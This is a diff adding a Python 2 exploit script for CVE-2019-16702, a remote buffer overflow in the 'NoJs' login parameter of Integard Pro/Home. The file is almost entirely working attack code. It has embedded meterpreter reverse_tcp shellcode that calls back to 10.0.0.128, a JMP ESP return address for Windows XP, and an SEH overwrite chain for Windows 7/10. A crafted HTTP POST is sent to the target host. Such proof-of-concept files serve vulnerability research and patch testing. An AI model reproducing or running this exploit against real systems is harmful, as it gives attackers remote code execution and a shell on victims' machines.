@@ -1,0 +1,148 @@
+Exploit Title: Integard Pro NoJs 2.2.0.9026 - Remote Buffer Overflow
+Date: 2019-09-22
+Exploit Author: purpl3f0xsecur1ty
+Vendor Homepage: https://www.tucows.com/
+Software Link: http://www.tucows.com/preview/519612/Integard-Home
+Version: Pro 2.2.0.9026 / Home 2.0.0.9021
+Tested on: Windows XP / Win7 / Win10
+CVE: CVE-2019-16702
+
+#!/usr/bin/python
+########################################################
+#~Integard Pro 2.2.0.9026 "NoJs" EIP overwrite exploit~#
+#~~~~~~~~~~~~~~~~Authored by purpl3f0x~~~~~~~~~~~~~~~~~#
+# The vulnerability: Integard fails to sanitize input  #
+# to the "NoJs" parameter in an HTTP POST request,     #
+# resulting in a stack buffer overflow that overwrites #
+# the instruction pointer, leading to remote code      #
+# execution.                                           #
+########################################################
+
+import socket
+import os
+import sys
+from struct import pack
+
+def main():
+    print "~*Integard RCE Exploit for XP/7/10*~"
+    print "Chose target: (Enter number only)"
+    print "1)  -  Windows XP"
+    print "2)  -  Windows 7/10"
+    target = str(input())
+    host = "10.0.0.130"
+    port = 18881
+
+    ####################################################
+    # Integard's functionality interferes with reverse #
+    # and bind shells. Only Meterpreter seems to work. #
+    ####################################################
+
+    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.128 LPORT=9001
+    # -b "\x00\x26\x2f\x3d\x3f\x5c" -f python -v meterpreter EXITFUNC=thread
+    meterpreter =  "\x90" * 50
+    meterpreter += "\xda\xcd\xbe\xa2\x51\xce\x97\xd9\x74\x24\xf4"
+    meterpreter += "\x5f\x2b\xc9\xb1\x5b\x83\xef\xfc\x31\x77\x15"
+    meterpreter += "\x03\x77\x15\x40\xa4\x32\x7f\x06\x47\xcb\x80"
+    meterpreter += "\x66\xc1\x2e\xb1\xa6\xb5\x3b\xe2\x16\xbd\x6e"
+    meterpreter += "\x0f\xdd\x93\x9a\x84\x93\x3b\xac\x2d\x19\x1a"
+    meterpreter += "\x83\xae\x31\x5e\x82\x2c\x4b\xb3\x64\x0c\x84"
+    meterpreter += "\xc6\x65\x49\xf8\x2b\x37\x02\x77\x99\xa8\x27"
+    meterpreter += "\xcd\x22\x42\x7b\xc0\x22\xb7\xcc\xe3\x03\x66"
+    meterpreter += "\x46\xba\x83\x88\x8b\xb7\x8d\x92\xc8\xfd\x44"
+    meterpreter += "\x28\x3a\x8a\x56\xf8\x72\x73\xf4\xc5\xba\x86"
+    meterpreter += "\x04\x01\x7c\x78\x73\x7b\x7e\x05\x84\xb8\xfc"
+    meterpreter += "\xd1\x01\x5b\xa6\x92\xb2\x87\x56\x77\x24\x43"
+    meterpreter += "\x54\x3c\x22\x0b\x79\xc3\xe7\x27\x85\x48\x06"
+    meterpreter += "\xe8\x0f\x0a\x2d\x2c\x4b\xc9\x4c\x75\x31\xbc"
+    meterpreter += "\x71\x65\x9a\x61\xd4\xed\x37\x76\x65\xac\x5f"
+    meterpreter += "\xbb\x44\x4f\xa0\xd3\xdf\x3c\x92\x7c\x74\xab"
+    meterpreter += "\x9e\xf5\x52\x2c\x96\x11\x65\xe2\x10\x71\x9b"
+    meterpreter += "\x03\x61\x58\x58\x57\x31\xf2\x49\xd8\xda\x02"
+    meterpreter += "\x75\x0d\x76\x08\xe1\xa4\x87\x0c\x71\xd0\x85"
+    meterpreter += "\x0c\x52\x08\x03\xea\xc4\x1a\x43\xa2\xa4\xca"
+    meterpreter += "\x23\x12\x4d\x01\xac\x4d\x6d\x2a\x66\xe6\x04"
+    meterpreter += "\xc5\xdf\x5f\xb1\x7c\x7a\x2b\x20\x80\x50\x56"
+    meterpreter += "\x62\x0a\x51\xa7\x2d\xfb\x10\xbb\x5a\x9c\xda"
+    meterpreter += "\x43\x9b\x09\xdb\x29\x9f\x9b\x8c\xc5\x9d\xfa"
+    meterpreter += "\xfb\x4a\x5d\x29\x78\x8c\xa1\xac\x49\xe7\x94"
+    meterpreter += "\x3a\xf6\x9f\xd8\xaa\xf6\x5f\x8f\xa0\xf6\x37"
+    meterpreter += "\x77\x91\xa4\x22\x78\x0c\xd9\xff\xed\xaf\x88"
+    meterpreter += "\xac\xa6\xc7\x36\x8b\x81\x47\xc8\xfe\x91\x80"
+    meterpreter += "\x36\x7d\xbe\x28\x5f\x7d\xfe\xc8\x9f\x17\xfe"
+    meterpreter += "\x98\xf7\xec\xd1\x17\x38\x0d\xf8\x7f\x50\x84"
+    meterpreter += "\x6d\xcd\xc1\x99\xa7\x93\x5f\x9a\x44\x08\x6f"
+    meterpreter += "\xe1\x25\xaf\x90\x16\x2c\xd4\x90\x17\x50\xea"
+    meterpreter += "\xad\xce\x69\x98\xf0\xd3\xcd\x83\xee\xf9\x3b"
+    meterpreter += "\x2c\xb7\x68\x86\x31\x48\x47\xc5\x4f\xcb\x6d"
+    meterpreter += "\xb6\xab\xd3\x04\xb3\xf0\x53\xf5\xc9\x69\x36"
+    meterpreter += "\xf9\x7e\x89\x13"
+
+    if target == "1":
+        print "[*] Sending Windows XP payload using meterpreter/reverse_tcp"
+        # JMP ESP at 0x3E087557 in iertutil.dll
+        crash = "A" * 512
+        crash += pack("<L",0x3E087557)
+        crash += meterpreter
+        crash += "C" * (1500 - len(crash))
+
+        buffer = ""
+        buffer += "POST /LoginAdmin HTTP/1.1\r\n"
+        buffer += "Host: 10.0.0.130:18881\r\n"
+        buffer += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
+        buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+        buffer += "Accept-Language: en-US,en;q=0.5\r\n"
+        buffer += "Accept-Encoding: gzip, deflate\r\n"
+        buffer += "Referer: http://10.0.0.130:18881/\r\n"
+        buffer += "Connection: close\r\n"
+        buffer += "Upgrade-Insecure-Requests: 1\r\n"
+        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
+        buffer += "Content-Length: 78\r\n\r\n"
+        buffer += "Password=asdf&Redirect=%23%23%23REDIRECT%23%23%23&NoJs=" + crash + "&LoginButtonName=Login\r\n"
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host,port))
+        s.send(buffer)
+        s.close()
+        print "[*] Done"
+
+    if target == "2":
+        print "[*] Sending Windows 7/10 payload using meterpreter/reverse_tcp"
+        
+        # ASLR IS ON!!! MUST USE NON-ASLR MODULE!
+        # POP POP RET in integard.exe (ASLR disabled)
+        nSEH = "\xEB\xD0\x90\x90"   # Jump 48 bytes backwards
+        SEH = pack("<L",0x004042B0)
+
+        jumpCall = "\xEB\x09" # Jump 11 bytes forward to hit the CALL in bigBackJump
+        bigBackJump = "\x59\xFE\xCD\xFE\xCD\xFE\xCD\xFF\xE1\xE8\xF2\xFF\xFF\xFF"
+        
+        crash = "\x90" * (2776 -len(jumpCall) - len(bigBackJump) - len(meterpreter) - 50)
+        crash += meterpreter
+        crash += "\x90" * 50
+        crash += jumpCall
+        crash += bigBackJump
+        crash += nSEH
+        crash += SEH
+
+
+        buffer = ""
+        buffer += "POST /LoginAdmin HTTP/1.1\r\n"
+        buffer += "Host: 10.0.0.130:18881\r\n"
+        buffer += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
+        buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+        buffer += "Accept-Language: en-US,en;q=0.5\r\n"
+        buffer += "Accept-Encoding: gzip, deflate\r\n"
+        buffer += "Referer: http://10.0.0.130:18881/\r\n"
+        buffer += "Connection: close\r\n"
+        buffer += "Upgrade-Insecure-Requests: 1\r\n"
+        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
+        buffer += "Content-Length: 78\r\n\r\n"
+        buffer += "Password=asdf&Redirect=%23%23%23REDIRECT%23%23%23&NoJs=" + crash + "&LoginButtonName=Login\r\n"
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host,port))
+        s.send(buffer)
+        s.close()
+        print "[*] Done"
+
+main()
